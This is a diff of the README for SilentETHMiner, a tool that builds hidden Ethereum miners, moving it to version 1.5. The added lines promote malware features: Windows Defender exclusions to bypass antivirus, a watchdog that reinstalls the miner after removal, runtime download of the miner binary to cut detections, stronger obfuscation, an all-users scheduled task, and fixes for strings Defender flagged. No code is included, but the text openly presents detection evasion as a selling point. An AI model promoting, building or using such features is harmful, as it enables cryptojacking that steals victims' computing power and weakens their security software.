@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentETHMiner/blob/master/SilentETHMiner.png?raw=true">
 
-# SilentETHMiner v1.4.2 - Based on Lime Miner v0.3
+# SilentETHMiner v1.5 - Based on Lime Miner v0.3
 
 
 ## Main Features
@@ -19,6 +19,12 @@
 * Watchdog - Replaces the miner if removed and starts it if closed down
 
 * Ethash - Supports mining all Ethash coins like Ethereum, Ethereum Classic, Metaverse, Ellaism, QuarkChain and others
+
+* Remote Configuration - Can get the connection settings remotely from a URL at each startup
+
+* Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
+
+* Online Downloader - Can download the miner binary during runtime (from GitHub) to greatly decrease file size and detections
 
 ## Downloads
 
@@ -43,6 +49,19 @@ So the requirements are as follow:
 
 ## Changes
 
+### v1.5 (05/07/2021)
+**v1.5 is the final update before the new, greatly improved unified miner that I'm working on.**
+* Added the Online Downloader option that makes the miner download the miner binary (from GitHub) during runtime to greatly decrease file size (to less then 100kb) and detections - Also added a cache so that it won't have to download the miner on every start
+* Added the Stealth Targets option which allows you to enter which programs the Stealth option should pause for
+* Added new options to 'Remote Configuration' that allows you to change some miner settings
+* Added {COMPUTERNAME}, {USERNAME} and {RANDOM} replacement strings support into 'Remote Configuration'
+* Made the Task Scheduler task start for all users
+* Fixed string that was triggering Windows Defender
+* Improved Watchdog program flow
+* Renamed "Kill" Windows Defender to Bypass Windows Defender to better represent the new functionality
+* Updated miner and made it more stable
+* Improved obfuscation/encryption
+* Improved overall code
 ### v1.4.2 (14/05/2021)
 * Made the Windows Defender Killer less intrusive, ironically to reduce detections
 ### v1.4.1 (13/05/2021)
